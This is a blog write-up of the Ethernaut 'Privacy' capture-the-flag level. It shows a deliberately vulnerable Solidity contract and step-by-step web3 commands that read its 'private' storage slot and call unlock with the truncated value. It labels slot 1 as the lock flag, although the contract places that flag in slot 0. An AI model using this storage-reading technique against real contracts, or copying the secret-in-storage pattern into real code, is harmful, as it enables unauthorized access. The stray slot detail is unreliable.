---
layout: post
title: Ethernaut - 12. Privacy
date:  2022-09-27
tags: ethernaut solidity
---
## Difficulty: 🌕🌕🌕🌕🌑
> The creator of this contract was careful enough to protect the sensitive areas of its storage.<br /><br />
Unlock this contract to beat the level.<br /><br />
Things that might help:
- Understanding how storage works
- Understanding how parameter parsing works
- Understanding how casting works 

## Contract
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {

  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }
  
  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

## Writeup
Although  `data` is `private` variable. We still can use `web3.eth.getStorageAt` to get the state of the contract's storage.
1. Get new instance.
2. Try to get `locked` value by `web3.eth.getStorageAt`.
    ``` javascript

    await web3.eth.getStorageAt("YOUR_LEVEL_INSTANCE_ADDRESS", 1)
    // '0x0000000000000000000000000000000000000000000000000000000000000001' // return locked value // true

    ```
3. Get `data[2]`.
    ``` javascript

    await web3.eth.getStorageAt("YOUR_LEVEL_INSTANCE_ADDRESS", 5)
    // '0x7c1db6671abbdbf3884f953ac1683887832f14843bc56d6f3250a825a233f93e' 

    ```
4. Unlock.
    ``` javascript

    await contract.unlock('0x7c1db6671abbdbf3884f953ac1683887')

    ```
5. Get `locked` value again.
    ``` javascript

    await web3.eth.getStorageAt("YOUR_LEVEL_INSTANCE_ADDRESS", 1)
    // '0x0000000000000000000000000000000000000000000000000000000000000000' // false

    ```
6. Submit instance ξ( ✿＞◡❛)